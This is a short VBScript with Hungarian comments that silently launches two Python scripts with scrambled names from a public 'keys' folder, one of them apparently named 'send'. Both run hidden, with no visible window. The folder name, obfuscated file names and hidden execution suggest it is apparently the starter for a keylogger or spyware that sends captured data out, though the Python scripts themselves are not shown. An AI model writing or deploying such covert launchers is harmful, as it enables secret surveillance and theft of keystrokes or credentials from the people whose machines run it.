Option Explicit

Dim shell, baseDir, spwPath, sendPath, fso

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' A mappa ahol a két .py fájl van
baseDir = "C:\Users\Public\Documents\keys"

spwPath = baseDir & "\spwww743g7w.py"
sendPath = baseDir & "\fwsendbfgw.py"

If Not fso.FileExists(spwPath) Then
    MsgBox "spw.py not found: " & spwPath
    WScript.Quit
End If

If Not fso.FileExists(sendPath) Then
    MsgBox "send.py not found: " & sendPath
    WScript.Quit
End If

' Indítás python.exe nélkül (a py launcher kezeli)
shell.Run "py """ & spwPath & """", 0, False
shell.Run "py """ & sendPath & """", 0, False
